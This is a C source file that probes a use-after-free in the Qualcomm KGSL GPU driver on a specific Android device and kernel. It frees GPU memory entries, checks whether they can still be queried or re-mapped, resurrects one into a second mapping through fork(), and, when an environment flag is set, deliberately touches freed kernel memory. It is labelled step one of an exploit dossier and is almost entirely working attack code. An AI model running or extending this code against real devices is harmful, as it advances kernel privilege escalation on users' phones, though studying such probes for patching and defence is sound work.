/* kgsl-pend.c — pending_free guard probe (dossier step 1/2).
 *
 * Target: RG3205W / msm8953 / Adreno 506 / kernel 3.18.71 armv7 / no KASLR.
 * Vendor fix 0a4ef64e3f ("Return mementry only if pending_free is not set") is
 * ABSENT from the device: kgsl_sharedmem_find[_id]() hand back an entry whose
 * pending_free flag is already set. This harness measures, observably:
 *
 *   O1  after GPUMEM_FREE_ID (pending_free=1) is GET_INFO / re-mmap still served?
 *   O2  can a pending-free entry be resurrected into a *second* vma after the
 *       first vma is closed (useraddr reset to 0)?  Extra vma ref obtained
 *       deterministically via fork() -> dup_mmap -> kgsl_gpumem_vm_open.
 *   O3  does an un-signaled GPUOBJ_FREE(FENCE) leave the entry findable?
 *
 * Everything is read-only / no spray by default. PEND_DANGER=1 additionally
 * touches a resurrected vma after the entry can no longer be referenced in the
 * normal way (may oops — that is the signal we are looking for).
 *
 * Build: zig cc -target arm-linux-musleabihf -static -O2 -w -Wl,--strip-all
 */
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <fcntl.h>
#include <unistd.h>
#include <errno.h>
#include <signal.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/socket.h>
#include <sys/wait.h>

#define KGSL_IOC_TYPE 0x09
struct kgsl_gpumem_alloc_id { unsigned int id, flags; size_t size, mmapsize; unsigned long gpuaddr; unsigned long __pad[2]; };
struct kgsl_gpumem_free_id  { unsigned int id, __pad; };
struct kgsl_gpumem_get_info { unsigned long gpuaddr; unsigned int id, flags; size_t size, mmapsize; unsigned long useraddr; unsigned long __pad[4]; };
struct kgsl_gpuobj_free { uint64_t flags; uint64_t priv; unsigned int id, type, len; };
struct kgsl_gpu_event_fence { int fd; };

#define IOCTL_PMEM_ALLOC_ID _IOWR(KGSL_IOC_TYPE,0x34,struct kgsl_gpumem_alloc_id)
#define IOCTL_PMEM_FREE_ID  _IOWR(KGSL_IOC_TYPE,0x35,struct kgsl_gpumem_free_id)
#define IOCTL_PMEM_GET_INFO _IOWR(KGSL_IOC_TYPE,0x36,struct kgsl_gpumem_get_info)
#define IOCTL_GPUOBJ_FREE   _IOW (KGSL_IOC_TYPE,0x46,struct kgsl_gpuobj_free)
#define KGSL_GPUOBJ_FREE_ON_EVENT 1
#define KGSL_GPU_EVENT_FENCE 2
#define DEV "/dev/kgsl-3d0"

static int g_fd=-1;
static int g_alarm=0;
static void on_alarm(int s){ (void)s; g_alarm=1; write(1,"[!] alarm\n",10); _exit(0x42); }

static int alloc_one(size_t sz, unsigned *id, unsigned long *gpu, size_t *mapsz){
    struct kgsl_gpumem_alloc_id a; memset(&a,0,sizeof a); a.size=sz; a.flags=0;
    if(ioctl(g_fd,IOCTL_PMEM_ALLOC_ID,&a)<0) return -1;
    *id=a.id; *gpu=a.gpuaddr; *mapsz=a.mmapsize?a.mmapsize:a.size;
    return 0;
}
static long get_info(unsigned id, unsigned long gpuaddr, struct kgsl_gpumem_get_info *out){
    struct kgsl_gpumem_get_info gi; memset(&gi,0,sizeof gi); gi.id=id; gi.gpuaddr=gpuaddr;
    errno=0; long r=ioctl(g_fd,IOCTL_PMEM_GET_INFO,&gi);
    if(out) *out=gi;
    return r;
}
static long free_id(unsigned id){
    struct kgsl_gpumem_free_id f; memset(&f,0,sizeof f); f.id=id;
    errno=0; return ioctl(g_fd,IOCTL_PMEM_FREE_ID,&f);
}
/* mmap by id: get_mmap_entry does find_id(pgoff) first, so offset == id<<12 */
static void *map_id(unsigned id, size_t sz){
    errno=0;
    return mmap(NULL,sz,PROT_READ|PROT_WRITE,MAP_SHARED,g_fd,(off_t)id<<12);
}

static void show_info(const char *tag,long r,struct kgsl_gpumem_get_info *gi){
    if(r<0) printf("    %s: rc=-1 errno=%d (%s)\n",tag,errno,strerror(errno));
    else    printf("    %s: rc=0 id=%u size=%zu mapsize=%zu gpu=0x%lx useraddr=0x%lx flags=0x%x\n",
                   tag,gi->id,gi->size,gi->mmapsize,gi->gpuaddr,gi->useraddr,gi->flags);
}

int main(void){
    setvbuf(stdout,NULL,_IONBF,0);
    signal(SIGALRM,on_alarm); alarm(60);
    printf("== kgsl pending_free probe (uid=%d) ==\n",(int)getuid());
    g_fd=open(DEV,O_RDWR);
    if(g_fd<0){ printf("[-] open %s: %s\n",DEV,strerror(errno)); return 1; }

    /* ---------------- O1: pending-free entry still served ---------------- */
    printf("[O1] alloc + mmap + FREE_ID + re-GET_INFO/re-mmap\n");
    unsigned id1; unsigned long gpu1; size_t ms1;
    if(alloc_one(0x1000,&id1,&gpu1,&ms1)){ printf("[-] alloc: %s\n",strerror(errno)); return 1; }
    printf("    E1 id=%u gpu=0x%lx mapsize=%zu\n",id1,gpu1,ms1);
    void *vmaA=map_id(id1,ms1);
    if(vmaA==MAP_FAILED){ printf("[-] mmap A: %s\n",strerror(errno)); vmaA=NULL; }
    else { memset(vmaA,0x41,0x1000); printf("    vmaA=%p canary=0x%02x\n",vmaA,((unsigned char*)vmaA)[0]); }
    { struct kgsl_gpumem_get_info gi; long r=get_info(id1,0,&gi); show_info("pre-free GET_INFO(id)",r,&gi); }
    long fr=free_id(id1); printf("    FREE_ID: rc=%ld errno=%d\n",fr,errno);
    { struct kgsl_gpumem_get_info gi; long r=get_info(id1,0,&gi); show_info("POST-free GET_INFO(id) [O1a]",r,&gi); }
    { struct kgsl_gpumem_get_info gi; long r=get_info(0,gpu1,&gi); show_info("POST-free GET_INFO(gpu) [O1b]",r,&gi); }
    { void *v=map_id(id1,ms1); printf("    re-mmap(id) [O1c]: %s\n",v==MAP_FAILED?strerror(errno):"SUCCESS");
      if(v!=MAP_FAILED) munmap(v,ms1); }
    if(vmaA){ printf("    vmaA canary after free: 0x%02x\n",((unsigned char*)vmaA)[0]); munmap(vmaA,ms1); }
    { struct kgsl_gpumem_get_info gi; long r=get_info(id1,0,&gi); show_info("after munmap A GET_INFO(id)",r,&gi); }

    /* ---------------- O2: fork-held ref -> reinstate useraddr=0 -> re-mmap ---------------- */
    printf("[O2] fork-held vma ref, close parent vma, resurrect into 2nd vma\n");
    unsigned id2; unsigned long gpu2; size_t ms2;
    if(alloc_one(0x1000,&id2,&gpu2,&ms2)){ printf("[-] alloc2: %s\n",strerror(errno)); return 1; }
    printf("    E2 id=%u gpu=0x%lx mapsize=%zu\n",id2,gpu2,ms2);
    void *vma1=map_id(id2,ms2);
    if(vma1==MAP_FAILED){ printf("[-] mmap vma1: %s\n",strerror(errno)); }
    else { memset(vma1,0x42,0x1000); printf("    vma1=%p\n",vma1); }

    int csync[2], psync[2];
    if(pipe(csync)||pipe(psync)){ perror("pipe"); return 1; }
    pid_t child=fork();
    if(child==0){
        /* child inherits vma1 -> dup_mmap calls kgsl_gpumem_vm_open (extra ref) */
        char c;
        write(csync[1],"R",1);
        read(psync[0],&c,1);       /* block until parent says go */
        _exit(0);
    }
    { char c; read(csync[0],&c,1); }
    printf("    child=%d forked (holds inherited vma ref)\n",(int)child);

    fr=free_id(id2); printf("    FREE_ID(E2): rc=%ld errno=%d\n",fr,errno);
    if(vma1){
        if(munmap(vma1,ms2)) printf("[-] munmap vma1: %s\n",strerror(errno));
        else printf("    munmap vma1 -> entry->useraddr should now be 0\n");
    }
    { struct kgsl_gpumem_get_info gi; long r=get_info(id2,0,&gi); show_info("GET_INFO(E2) after munmap vma1 [O2a]",r,&gi); }
    void *vma2=map_id(id2,ms2);
    if(vma2==MAP_FAILED){ printf("    re-mmap(E2) [O2b]: %s  (no resurrection)\n",strerror(errno)); vma2=NULL; }
    else { printf("    re-mmap(E2) [O2b]: SUCCESS vma2=%p  <-- RESURRECTED\n",vma2);
           memset(vma2,0x43,0x1000); }
    { struct kgsl_gpumem_get_info gi; long r=get_info(id2,0,&gi); show_info("GET_INFO(E2) after re-mmap [O2c]",r,&gi); }

    if(getenv("PEND_DANGER") && vma2){
        /* Let the child die: its inherited vma closes and drops one ref. If the
         * resurrected vma does NOT hold a balanced ref, E2 is freed here while
         * vma2 still points at it. Touching vma2 then exercises
         * kgsl_gpumem_vm_fault -> entry->memdesc.ops->vmfault on freed memory. */
        printf("[O2-danger] releasing child and touching resurrected vma\n");
        write(psync[1],"g",1);
        int st; waitpid(child,&st,0);
        printf("    child reaped; reading vma2[0]=0x%02x (may oops)\n",((unsigned char*)vma2)[0]);
        memset(vma2,0x44,0x1000);
        printf("    vma2[0]=0x%02x survived\n",((unsigned char*)vma2)[0]);
        { struct kgsl_gpumem_get_info gi; long r=get_info(id2,0,&gi); show_info("GET_INFO(E2) post-child [O2d]",r,&gi); }
    } else {
        printf("[O2] (PEND_DANGER unset: leaving child alive, no risky touch)\n");
    }

    printf("== done ==\n");
    return 0;
}
